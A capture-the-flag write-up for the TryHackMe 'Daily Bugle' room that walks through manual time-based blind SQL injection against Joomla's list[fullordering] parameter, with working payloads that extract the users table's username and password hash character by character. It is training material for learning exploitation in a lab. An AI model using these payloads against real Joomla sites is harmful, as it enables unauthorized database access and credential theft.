# The Daily Bugle Room

### Introduction

Room hosted at https://tryhackme.com/

I tried doing this room without `sqlmap` as OSCP does not allow it in the exam. I wanted to see at least how you can take advantage of the blind sql injecion. 

All the write-ups for this room were using sqlmap and I will discuss how I did it without it. This will possibly help you as I could not find a straight forward guide on this exact setup.

### Diving into the SQLi
So we know the Joomla version and we have an exploit for it.

```
Parameter: list[fullordering] (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (DUAL)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)

    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)
```

Searched the internet I could not find the exact way to leverage this info. Running `list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)` takes 5 seconds to return data, which means we can test queries. Playing with  the query `list[fullordering]=xxxx` yelds `Unknown column 'xxxx' in 'order clause'` and a 500 response. Now I know there is an **order by** statement there and that a correct query would return 200 and display an error. 

I am now trying to construct the original query using https://sqliteonline.com/ to test it.

```
SELECT 1 FROM demo ORDER BY 2;
```

**ORDER BY** takes selects as input as long as the select returns one column. Step by step I am going to build a query that will take longer when we have true statements. `SLEEP()` usually returns a 0 I am not sure why you can order by it but it seems to work.

```
SELECT 1 FROM demo ORDER BY (SELECT SLEEP(5) FROM demo limit 1);
```

So the query works and is delayed by 1 second. With adding of the WHERE statement we can make true/false selections.

```
SELECT 1 FROM demo ORDER BY (SELECT SLEEP(5) FROM demo limit 1);
SELECT 1 FROM demo ORDER BY (SELECT SLEEP(5) FROM demo where 1>2 limit 1); #FALSE
SELECT 1 FROM demo ORDER BY (SELECT SLEEP(5) FROM demo where 1<2 LIMIT 1); #TRUE
SELECT 1 FROM demo ORDER BY (SELECT SLEEP(5) FROM demo where (SELECT COUNT(1) FROM demo)=6 LIMIT 1); # TRUE 
SELECT 1 FROM demo ORDER BY (SELECT SLEEP(5) FROM demo where (SELECT COUNT(1) FROM demo)=5 LIMIT 1); # FALSE
```

Now we can use this to test how many rows a table has in our application. Joomla documentation shows us the default table for users. I am now using 

```
(SELECT SLEEP(5) FROM #__users where (SELECT COUNT(1) FROM #__users)=1 LIMIT 1)
```
I am not sure if we can send this directly to our browser. Let's url encode it
```
%28SELECT%20SLEEP%285%29%20FROM%20%23__users%20where%20%28SELECT%20COUNT%281%29%20FROM%20%23__users%29%3D1%20LIMIT%201%29 
```

I can now use OWASP Zap to fuzz the 1 here *%28SELECT%20COUNT%281%29%20FROM%20%23__users%29%3D**1**%20*. We can also write a script to automate this in python like we will see below.

Ok. So running the fuzzer shows a single row. Moving forward we check how many characters would the username and passwrod have.

```
(SELECT SLEEP(5) from #_users WHERE ((SELECT LENGTH(username) FROM #__users LIMIT 1 OFFSET 0))=1 limit 1)
```

Now we know how many characters we need to iterate thorugh to get the data. 
```
(SELECT SLEEP(5) from #__users WHERE substring((SELECT username FROM #__users LIMIT 1 OFFSET 0),1,1)=BINARY 0x6a limit 1)
(SELECT SLEEP(5) from #__users WHERE substring((SELECT username FROM #__users LIMIT 1 OFFSET 0),2,1)=BINARY 0x6a limit 1)
```
**LIMIT ... OFFSET ...** is used to iterate one row at a time. We do not need this for here as we have only one row in the table but might come in handy.

**substring(...,...,...)** is used to take each character at a time.

**=BINARY 0x...** is needed because Joomla did not like any '/" characters and so we switched to hex encoding. 

Extraction time. Being the password is really long we need some automation. We can do it in OWASP Zap I figure but I am not sure if it's easy to trasnfer out the data. A python script should work. :) 

I did the last part in  https://github.com/hack3rman/TryHackMe/blob/master/db-blind.py 

## Note
I just started in the security business and only have some experience as System Administrator. The guide might not be perfect but I await your input. Good luck!
